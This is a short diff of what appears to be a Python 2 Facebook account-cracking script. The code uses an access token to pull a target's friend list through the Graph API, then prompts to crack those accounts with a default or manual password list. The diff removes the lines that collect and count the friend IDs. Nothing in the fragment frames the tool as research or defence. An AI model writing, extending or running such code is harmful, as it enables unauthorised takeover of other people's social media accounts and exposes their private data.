@@ -173,9 +173,6 @@ def public():
 	    exit()
     r = requests.get("https://graph.facebook.com/"+idp+"/friends?access_token="+toket)
     z = json.loads(r.text)
-    for i in z['data']:
-	    id.append(i['id'])
-    print "   [•] Total ID       : "+str(len(id))
     mtd = raw_input("\n   [•] Crack With Default/Manual Pass [d/m] : ")
     if mtd=="":
         print("   [!] Fill In The Correct")
